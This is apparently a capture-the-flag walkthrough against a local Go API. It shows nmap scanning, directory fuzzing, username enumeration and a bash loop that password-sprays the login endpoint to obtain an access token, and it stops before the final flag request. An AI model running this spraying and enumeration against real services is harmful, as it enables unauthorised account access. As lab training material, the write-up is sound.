## Path

The first thing we can notice is that the there is some kind of the web server on the port 8080.

```bash
$ nmap -p 8080 localhost -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 13:16 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00032s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

We can notice that it is some kind of Golang web server, and we get 404 on the visit.

If we start fuzzing dirs with dirb or wfuzz we can find `/api/` endpoint with message
```json
{"message": "I have different versions"}
```

So we need to fuzz even more to find the correct version and soon enough we can find the
```/api/v1/```.

Let's see what other endpoints there exists.
```bash
---- Scanning URL: http://localhost:8080/api/v1/ ----
+ http://localhost:8080/api/v1/list (CODE:200|SIZE:74)
+ http://localhost:8080/api/v1/login (CODE:200|SIZE:65)
+ http://localhost:8080/api/v1/users (CODE:200|SIZE:233)
```

We can see three endpoints found by the `dirb`.

Accessing the `/api/v1/users/` return us the list of the users.

```bash
$ curl -L http://localhost:8080/api/v1/users
[
    "root",
    "admin",
    "test",
    "guest",
    "info",
    "adm",
    "mysql",
    "user",
    "administrator",
    "oracle",
    "ftp",
    "pi",
    "puppet",
    "ansible",
    "ec2-user",
    "vagrant",
    "azureuser"
]
```

It is some kind of possible usernames on the API.

Accessing the `/api/v1/list/` gives us the following.

```bash
$ curl http://localhost:8080/api/v1/list
{
    "keys": [
        "user",
        "password",
        "flag"
    ]
}
```

So we can see our flag in there and if we try to access it, we get:

```bash
curl http://localhost:8080/api/v1/list/flag
{"message": "You not to provide FIT-Token header"}
```

So we need to pass FIT-Token header but how could we obtain it.

Let's take a look at the last endpoint found.

```bash
$ curl http://localhost:8080/api/v1/login
{"message": {"You need to pass username and password using JSON"}
```

Ah, so we need to pass username and password in json notation. 
Remember that we already have a list of usernames but not the password so let's use the 
_password spraying_ technique.

We can do it with bash, just prepare your users file to have just a username on each line without any extra 
characters.

```bash
$ for user in $(cat /tmp/new_users); do
for> curl -s -H "Content-Type: application/json" http://localhost:8080/api/v1/login -d "{\"username\": \"${user}\", \"password\":\"password\"}" | grep -v 'Wrong username or password' && echo "Username => ${user}"; done
{"message": "Good job, correct login"}
Username => puppet
```

So our credentials are `puppet` as a username and `password` as password.

If we now try to login with these credentials, we will obtain FIT-Token header in response.

Let's try it out.

```bash
$ curl -v -H "Content-Type: application/json" http://localhost:8080/api/v1/login -d "{\"username\": \"puppet\", \"password\":\"password\"}"
*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 8080 (#0)
> POST /api/v1/login HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.64.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 45
>
* upload completely sent off: 45 out of 45 bytes
< HTTP/1.1 200 OK
< Content-Type: application/json; charset=UTF-8
< Fit-Token: <Here goes hashed token>
< Date: Wed, 21 Apr 2021 11:41:04 GMT
< Content-Length: 38
<
* Connection #0 to host localhost left intact
{"message": "Good job, correct login"}* Closing connection 0
```

We can see that we got our `Fit-Token` back. 

For the final step, let's pass it to the the `/api/v1/list/flag` endpoint.

